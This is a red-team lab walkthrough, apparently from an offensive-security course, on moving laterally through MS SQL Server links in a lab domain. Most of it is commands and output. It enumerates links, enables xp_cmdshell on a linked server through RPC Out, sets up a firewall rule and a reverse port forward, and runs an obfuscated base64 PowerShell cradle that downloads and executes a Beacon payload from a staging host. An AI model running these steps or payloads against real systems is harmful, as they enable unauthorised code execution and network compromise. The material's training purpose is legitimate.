SQL Servers have a concept called "links", which allows a database instance to access data from an external source.  MS SQL supports multiple sources, including other MS SQL Servers.  These can also be practically anywhere - including other domains, forests or in the cloud.

We can discover any links that the current instance has:
`SELECT srvname, srvproduct, rpcout FROM master..sysservers;`

on `Attacker Desktop` on `WSL` execute the command above after connecting to the `MSSQL` server as `Bfarmer`
```sql
SQL> SELECT srvname, srvproduct, rpcout FROM master..sysservers;
srvname
           srvproduct
                          rpcout

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ----------

SQL-2
           SQL Server
                               1

SQL-1.CYBERBOTIC.IO
           SQL Server
                               1

SQL>
```
This shows that SQL-2 has a link to SQL-1.  The SQLRecon `links` module could also be used.
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
[+] host called home, sent: 307580 bytes
[+] received output:
[*] Additional SQL links on sql-2.dev.cyberbotic.io,1433
name | product | provider | data_source | 
------------------------------------------
SQL-1.CYBERBOTIC.IO | SQL Server | SQLNCLI | SQL-1.CYBERBOTIC.IO |
```
We can send SQL queries to linked servers using _OpenQuery_:
*The use of double and single quotes is important when using OpenQuery.*
```sql
SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');



--------------------------------------------------------------------------------------------------------------------------------

SQL-1
```
Or with SQLRecon:
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
[+] host called home, sent: 307678 bytes
[+] received output:
[*] Executing 'select @@servername' on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
column0 | 
----------
SQL-1 |
```
We can also check the xp_cmdshell status.
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
[+] host called home, sent: 307780 bytes
[+] received output:
[*] Executing 'select name,value from sys.configurations WHERE name = ''xp_cmdshell''' on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
name | value | 
---------------
xp_cmdshell | 0 |
```
If xp_cmdshell is disabled, you won't be able to enable it by executing sp_configure via OpenQuery.  If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:
```sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

SQL> EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
[*] INFO(SQL-1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
[*] INFO(SQL-1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL>
```
We can query SQL-1 to find out if it has any further links.
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
[+] host called home, sent: 307628 bytes
[+] received output:
[*] Additional SQL links on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
[+] No results.
```
In this case it does not, but manually querying each server to find additional links can be cumbersome and time-consuming.  Instead, `Get-SQLServerLinkCrawl` can automatically crawl all available links and shows you a bit of information for each instance.
```powershell
beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
[*] Tasked beacon to run: Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433" (unmanaged)
[+] host called home, sent: 138082 bytes
[+] received output:

Path        : {SQL-2, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : 
```
This output shows that the link from SQL-2 to SQL-1 is configured with a local `sa` account, and that it has sysadmin privileges on the remote server.  Your level of privilege on the linked server will depend on how the link is configured.  It's worth noting that in this particular case, any user who has public read access to the SQL-2 database instance will inherit sysadmin rights on SQL-1.  We do not need to be sysadmin on SQL-2 first.

The `lwhoami` module in SQLRecon can show similar information.

```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io

```
To execute a Beacon on SQL-1, we can pretty much repeat the same steps as previously.  However, note that SQL-1 may only be able to talk to SQL-2 and not to WKSTN-2 or any other machine in the DEV domain.

```powershell
beacon> run hostname
sql-2

beacon> getuid
[*] You are DEV\mssql_svc (admin)

beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```
both are executed in `mssqlclient.py` session
You can use xp_cmdshell on a linked server via OpenQuery (note that you need to prepend a dummy query) for it to work.
```sql
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')
```
Or you can use the "AT" syntax:
```sql
EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]

```
Once the payload has been executed, connect to the Beacon.
```powershell
